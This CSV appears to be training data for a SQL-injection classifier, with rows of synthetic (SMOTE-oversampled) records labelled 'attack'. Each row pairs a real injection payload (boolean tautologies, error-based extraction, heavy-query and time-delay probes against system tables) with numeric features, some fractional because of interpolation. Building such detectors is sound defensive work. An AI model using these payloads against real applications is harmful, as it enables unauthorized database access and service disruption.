id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000029,attack,boolean,"1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'onmp'  =  'onmp",nearest_attack_euclidean,R003348,0.2062874874186802,290.8662538795843,32.0,3.6235273413751186,59.0,71.0,123.89300310366741,36.97325077591685,0.20290222808902533,0.24417047786984403,0.425834535320577,0.12709275872055362,4.0,-1.1102230246251565e-16,0.0,0.0,2.0,2.0,0.0,22.97325077591685,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-2.7755575615628914e-17,3.9999999999999996,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000030,attack,boolean,"1'+  (  select mumb where 4658  =  4658 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003302,0.29630427898307016,216.72900738710254,35.756997537632486,3.9078627846881977,67.0,35.0,81.0,33.729007387102534,0.30915264047573415,0.1614976480097119,0.37375169967961896,0.155598011834935,1.486004924735023,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,3.0,11.24300246236751,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000031,attack,boolean,"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""bzzt"" like ""bzzt",nearest_attack_euclidean,R000836,0.30688555018310915,355.6646849574778,30.71729182075892,3.303783446624732,92.43458364151783,47.0,166.2406226886162,49.989478627343786,0.2602662271273098,0.13227652990709982,0.4669751572930977,0.14048208567249268,0.0,4.0,0.0,0.0,0.0,1.14135408962054,0.0,34.848124537723244,0.0,0.0,0.0,11.141354089620542,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000032,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""khuw"" like ""khuw",nearest_attack_euclidean,R001451,1.2865146718906624,116.6888376608781,28.674230588529323,4.026629986293423,64.90114824440894,5.977308234412037,30.416536473822532,15.393844708234568,0.5517191393668561,0.056199687935650486,0.26181482478384305,0.13026634791365038,0.0,3.0,0.0,0.0,1.0,0.0,0.0,4.674230588529321,0.0,3.6969223541172838,3.0226917655879633,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000033,attack,boolean,"1'||  (  select 'aoad' where 8795  =  8795 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R001837,0.0435582332726108,281.9036335637828,37.98006606479605,3.8548391753251634,86.62125523112496,35.0,110.52158555510523,49.76079277755261,0.3072376032229754,0.12426961789826424,0.39201390779422984,0.17647887108453056,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,23.880396388776308,0.0,1.980066064796051,3.980066064796051,15.920264259184204,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.960132129592102,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.960132129592102
SMOTE_000034,attack,boolean,-6500'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'padu' like 'padu,nearest_attack_euclidean,R003213,0.5701623819551118,78.18364511215557,24.0,3.4984923651344593,17.0,16.0,33.01455295327621,12.16909215887937,0.2191969444036318,0.20630300649753583,0.4187489683355935,0.15575108076323885,4.0,-1.1102230246251565e-16,1.0,0.0,1.0,1.0,0.0,5.169092158879369,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000035,attack,boolean,"1""   )    )    as oiqr where 4073  =  4073 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000635,0.0827234339293178,129.71444185680727,33.69525891424097,3.766292980715296,41.08577674272291,21.0,51.78103565696388,15.847629457120485,0.3165835257739911,0.16219869988390617,0.39894012485809677,0.12227764948400593,0.0,1.0,2.0,0.0,1.0,2.0,0.0,7.847629457120485,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000036,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000913,0.10552761208310232,72.54357351064091,26.634858808512725,3.6297141379598776,11.634858808512732,24.0,28.0,8.908714702128181,0.16011720606239685,0.330973858933243,0.38613616875545015,0.12277276624890995,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,4.0,0.0,0.9087147021281814,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,boolean,"1%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",nearest_attack_euclidean,R000849,0.2289355363367696,191.1633806356744,29.0,3.559488050099361,111.0,12.0,48.33070450853951,19.832676127134878,0.581038159272514,0.06281493613756908,0.2524631400008562,0.10368376458906074,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,4.832676127134878,2.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000038,attack,boolean,"1""  )   as tqxa where 6751  =  6751 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R003420,0.3760647042078047,276.99763584836495,34.0,3.7722828820183545,59.0,79.0,106.99763584836495,32.0,0.21301186510620912,0.285219277006619,0.3862369988465161,0.1155318590406558,0.0,0.8337273586058412,2.0,0.0,2.0,2.0,0.0,19.16627264139416,0.0,0.0,6.0,6.0,0.0,0.8337273586058412,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-2.7755575615628914e-17,3.9999999999999996,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000039,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- xgyc",nearest_attack_euclidean,R003549,0.3203926752757718,97.67508543656655,29.282106241471475,3.7059449336258417,34.04280832196197,13.0,38.15368127558557,12.478595839019016,0.3493610041088713,0.1332143901016014,0.3898109149210982,0.1276136908684291,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.478595839019016,0.0,1.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000040,attack,boolean,"1   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001288,0.23743865396266417,133.1222851289936,29.602621779881602,3.96435509955956,66.1091762295856,8.3013108899408,42.8078653396448,15.903932669822401,0.49688299079371584,0.06237012461640483,0.3214651440294072,0.11928174056047217,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.3013108899408,0.0,0.0,2.3013108899408,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,boolean,1%'   )    )    and 1651  =  9324 and    (    (   '%'  =  ',nearest_attack_euclidean,R002505,0.4143240983085533,66.03180188957273,17.171966981595457,2.7993346178657497,7.171966981595453,10.562622642127275,35.12524528425455,13.171966981595455,0.10762827219385768,0.1589056832223981,0.5334298506063594,0.2000361939773848,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,4.7813113210636375,2.0,0.0,0.3906556605318183,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000042,attack,boolean,"1'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001822,0.24237700142334379,183.14690356547572,31.146903565475743,3.6474265452027805,53.0,25.0,74.0,31.146903565475743,0.28938625894006254,0.1365029523302182,0.4040487388974458,0.17006204983227347,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,17.0,0.14690356547574202,1.0,3.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000043,attack,boolean,"1' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001023,0.17043517130947108,134.93015700653677,32.0,4.2532766195218255,74.67104957547514,9.0,34.976719002178925,16.282388428882705,0.5531020283086399,0.06700922929928523,0.2588786341119053,0.12101010828016953,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.282388428882703,0.0,0.0,3.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000044,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R001324,0.1227346346031077,168.45037991219604,36.0,3.9431878383889187,51.0,24.0,63.0,30.450379912196034,0.30276717872822134,0.1424786723426924,0.3740065148995676,0.18074763402951866,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,2.0,1.0,10.450379912196034,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,boolean,-4428  )   or 3038  =  3038,nearest_attack_euclidean,R001603,0.6458431327009027,29.791426174770834,11.398775167824404,2.812954300884967,2.0,12.0,12.39265100694643,3.3987751678244056,0.06799253556694809,0.4079552134016885,0.4103347662743412,0.11371748475702224,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,1.3987751678244038,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000046,attack,boolean,"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""eoab"" like ""eoab",nearest_attack_euclidean,R000869,0.1888917627615492,396.65787000888906,31.222588749629622,3.2868819565508796,107.0,47.0,186.54822500740755,56.10964500148151,0.26993082148153985,0.11856774401525581,0.47006194741425167,0.14143948708895265,0.0,4.0,0.0,0.0,0.0,2.0,0.0,39.10964500148152,0.0,0.0,1.0,12.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000047,attack,boolean,"1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002404,0.2696811241024163,209.34581567091584,35.205579105445565,3.816788190574772,63.0,33.345815670915826,82.0,31.0,0.300952734522701,0.15924315434927963,0.391716257632722,0.14808785349529732,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,3.0,10.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000048,attack,boolean,"1""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002839,0.03517511161414732,109.12204044296315,34.0,3.7036265784848355,31.0,15.0,46.21815095302848,16.903889489934674,0.2854590548528403,0.13812534912234206,0.4216117292204791,0.1548038668043385,2.0,1.0,2.0,1.0,0.0,1.0,0.0,8.903889489934674,0.0,0.0,1.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000049,attack,boolean,"1   )    )    as rpwt where 4103  =  4103 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000944,0.08329136962928045,157.0,33.652353931182255,4.119885517206616,76.0,16.0,49.0,16.0,0.4840764331210191,0.10191082802547771,0.31210191082802546,0.10191082802547771,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000050,attack,boolean,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",nearest_attack_euclidean,R000405,0.48525416709125263,308.81099979798773,38.27362502525154,3.975947428144407,119.09450010100616,34.0,113.53737477273616,42.179124924245386,0.3857745328626953,0.11011456715660563,0.3675575178308488,0.1365533821498503,0.0,4.0,0.0,0.0,0.0,1.7263749747484614,0.0,23.452749949496923,0.0,3.0,3.0,7.726374974748461,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.0
SMOTE_000051,attack,boolean,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,nearest_attack_euclidean,R000034,0.016262090683629875,55.0,22.89228580831547,3.7152032337804606,24.0,4.0,18.0,9.0,0.43636363636363634,0.07272727272727272,0.32727272727272727,0.16363636363636364,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000052,attack,boolean,"a' or 1  =  1, --",nearest_attack_euclidean,R000234,1.6768427940611637,19.759402587744816,10.379701293872415,2.914350447207347,4.83960172516322,2.0,6.540099568709195,6.379701293872415,0.23528138507555052,0.10353246758186788,0.34236796561085037,0.3188181817317312,2.83960172516322,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.5400995687091951,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000053,attack,boolean,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""jebr"" like ""jebr",nearest_attack_euclidean,R002377,0.0020157065458629476,311.95529660561067,39.99503295617896,4.005587727336818,122.0,34.0,113.96523069325274,41.99006591235792,0.39108333136705065,0.10899043661048952,0.3653237725655331,0.13460245945692673,0.0,4.0,0.0,0.0,0.0,1.0,0.0,23.990065912357927,0.0,3.0,3.0,7.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.0
SMOTE_000054,attack,boolean,"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --",nearest_attack_euclidean,R001777,0.019707842348087864,75.84421676538722,24.922108382693605,3.753843930167143,15.883162574040409,24.0,25.9610541913468,10.0,0.20929041938484433,0.3165129252381399,0.3423162698611241,0.13188038551589162,1.0,-1.1102230246251565e-16,3.0,0.0,0.0,2.0,0.0,3.000000000000001,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,boolean,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'uorw' like 'uorw",nearest_attack_euclidean,R002250,0.10233418393209863,134.54319923414357,31.060700031910685,3.5909613569424113,46.0,13.0,57.78599936178631,17.757199872357262,0.34263477122041724,0.09683156577968313,0.4286270455874782,0.13190661741242143,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.757199872357262,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000056,attack,boolean,"1%""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R003609,0.553512435520627,290.7617544592566,32.0,3.546956709605781,51.76175445925661,71.0,128.0,40.0,0.1780194254741359,0.24418669787170022,0.4402239060222201,0.1375699706319438,0.0,4.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,0.0,6.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-2.7755575615628914e-17,3.9999999999999996,0.0,0.0,1.0,1.7617544592566081,0.23824554074339171,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000057,attack,boolean,-2983'  )   or 8571  =  8571--,nearest_attack_euclidean,R002511,0.0,30.0,14.0,3.2825887305018333,2.0,12.0,10.0,6.0,0.06666666666666665,0.4,0.3333333333333333,0.2,1.0,-1.1102230246251565e-16,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
